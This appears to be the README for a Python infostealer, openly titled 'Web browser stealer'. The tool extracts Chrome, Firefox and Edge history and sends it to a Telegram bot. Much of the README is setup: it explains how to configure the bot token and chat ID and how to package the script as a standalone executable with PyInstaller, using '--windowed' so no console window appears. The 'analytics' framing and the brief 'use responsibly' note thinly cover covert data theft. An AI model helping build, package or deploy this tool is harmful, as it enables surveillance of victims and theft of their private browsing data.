# Web browser stealer

A Python application that extracts browser history from Chrome, Firefox, and Edge, then sends the analytics data to a Telegram bot. Compatible with Windows 10/11 (32-bit and 64-bit), macOS, and Linux.

## Features

- Extracts browser history from Chrome, Firefox, and Edge
- Cross-platform compatibility (Windows, macOS, Linux)
- Sends analytics reports to Telegram
- Exports data to CSV and JSON formats
- Comprehensive logging
- Error handling for locked databases

## Prerequisites

- Python 3.6 or higher
- Telegram Bot Token and Chat ID

## Installation

### 1. Clone or Download the Project

```bash
git clone <repository-url>
cd web-usage-analytics-tool
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

### 3. Set Up Telegram Bot

1. Create a Telegram bot by talking to [@BotFather](https://t.me/BotFather)
2. Copy your bot token
3. Get your Telegram chat ID:
   - Send a message to your bot
   - Visit `https://api.telegram.org/bot<BOT_TOKEN>/getUpdates`
   - Find your chat ID in the response

### 4. Configure the Application

Open `main.py` and replace these values:

```python
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"  # Replace with your chat ID
```

## Running the Application

### Direct Python Execution

```bash
python main.py
```

### Converting to Executable (.exe for Windows)

1. Install PyInstaller:
```bash
pip install pyinstaller
```

2. Create executable:
```bash
pyinstaller --onefile --windowed main.py
```

3. Find the executable in the `dist` folder

### Creating Standalone Executables for Other Platforms

#### Using PyInstaller (Cross-platform)

For Windows:
```bash
pyinstaller --onefile --windowed main.py
```

For macOS:
```bash
pyinstaller --onefile main.py
```

For Linux:
```bash
pyinstaller --onefile main.py
```

#### Additional Options

- `--onefile`: Creates a single executable file
- `--windowed`: Prevents console window from appearing (Windows only)
- `--hidden-import=requests`: Include hidden imports if needed
- `--icon=icon.ico`: Add custom icon

Example with additional options:
```bash
pyinstaller --onefile --windowed --hidden-import=requests --icon=app_icon.ico main.py
```

### Using cx_Freeze (Alternative)

1. Install cx_Freeze:
```bash
pip install cx_freeze
```

2. Create setup.py:
```python
from cx_Freeze import setup, Executable

setup(
    name="WebUsageAnalytics",
    version="1.0",
    description="Browser History Analytics Tool",
    executables=[Executable("main.py")]
)
```

3. Build executable:
```bash
python setup.py build
```

## Configuration

Before running the application, you must configure your Telegram credentials in the code:

1. Edit `main.py`
2. Find these lines:
```python
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
```
3. Replace with your actual Telegram bot token and chat ID

## Output Files

The application generates several output files:

- `web_usage_audit_<timestamp>.log` - Audit trail log
- `web_usage_analytics_<timestamp>.csv` - CSV export of browser history
- `web_usage_analytics_<timestamp>.json` - JSON export of browser history
- `analytics_summary_<timestamp>.json` - Summary report

## Troubleshooting

### Common Issues

1. **Permission Error**: Make sure the browser is closed before running the tool
2. **Database Locked**: Close all browser instances before running
3. **Missing Dependencies**: Run `pip install -r requirements.txt`
4. **Telegram Not Working**: Verify your bot token and chat ID are correct

### Platform-Specific Notes

- **Windows**: Requires access to AppData folders
- **macOS**: May require accessibility permissions for some applications
- **Linux**: Requires proper file permissions

## Security Note

This tool accesses sensitive browser history data. Use responsibly and ensure appropriate permissions before deployment.

## License

MIT License - Feel free to modify and distribute
